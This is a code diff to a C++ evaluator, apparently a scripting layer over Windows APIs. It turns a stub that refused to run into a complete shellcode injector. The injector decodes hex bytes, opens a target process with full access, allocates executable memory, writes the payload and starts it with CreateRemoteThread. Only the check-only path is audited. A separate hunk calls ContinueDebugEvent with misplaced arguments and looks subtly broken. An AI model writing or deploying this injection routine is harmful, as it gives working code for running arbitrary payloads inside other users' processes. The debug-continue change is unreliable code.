@@ -1335,7 +1335,10 @@ WapiValue Evaluator::wapi_debugReadRegisters(int tid) {
 
 WapiValue Evaluator::wapi_debugContinue(int eventCode) {
     if (options.checkOnly) { emitAudit("debugContinue", "debug.attach", "allow", "checkOnly no side-effects"); return 0; }
-    return eventCode;
+    if (!ContinueDebugEvent(eventCode, 0, 0)) {
+        throw WapiUnstableException("Failed to continue debug event");
+    }
+    return 0;
 }
 
 WapiValue Evaluator::wapi_openProcessToken(long long handle) {
@@ -1379,7 +1382,54 @@ WapiValue Evaluator::wapi_injectShellcode(int pid, const std::string& hexBytes) 
     if (pid <= 0) throw WapiUnstableException("Invalid pid");
     if (hexBytes.empty()) throw WapiUnstableException("Shellcode is empty");
     if (options.checkOnly) { emitAudit("injectShellcode", "inject.shellcode", "allow", "checkOnly no side-effects"); return 0; }
-    throw WapiUnstableException("injectShellcode requires a byte decoder implementation before execution; check mode is supported");
+
+    std::vector<unsigned char> shellcode;
+    shellcode.reserve(hexBytes.size() / 2);
+
+    for (size_t i = 0; i < hexBytes.size(); i += 2) {
+        std::string byteString = hexBytes.substr(i, 2);
+        unsigned char byte = static_cast<unsigned char>(std::stoul(byteString, nullptr, 16));
+        shellcode.push_back(byte);
+    }
+
+    if (shellcode.empty()) {
+        throw WapiUnstableException("Failed to decode shellcode - invalid hex string");
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, static_cast<DWORD>(pid));
+    if (!hProcess) throw WapiUnstableException("Failed to open process for shellcode injection");
+
+    LPVOID remote = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!remote) {
+        CloseHandle(hProcess);
+        throw WapiUnstableException("Failed to allocate memory for shellcode");
+    }
+
+    SIZE_T bytesWritten = 0;
+    if (!WriteProcessMemory(hProcess, remote, shellcode.data(), shellcode.size(), &bytesWritten) || bytesWritten != shellcode.size()) {
+        VirtualFreeEx(hProcess, remote, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        throw WapiUnstableException("Failed to write shellcode to process memory");
+    }
+
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remote), nullptr, 0, nullptr);
+    if (!hThread) {
+        VirtualFreeEx(hProcess, remote, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        throw WapiUnstableException("Failed to create remote thread for shellcode");
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    DWORD exitCode = 0;
+    GetExitCodeThread(hThread, &exitCode);
+
+    VirtualFreeEx(hProcess, remote, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    std::cout << "Shellcode injected successfully, exit code: " << exitCode << "\n";
+    return static_cast<long long>(exitCode);
 }
 
 
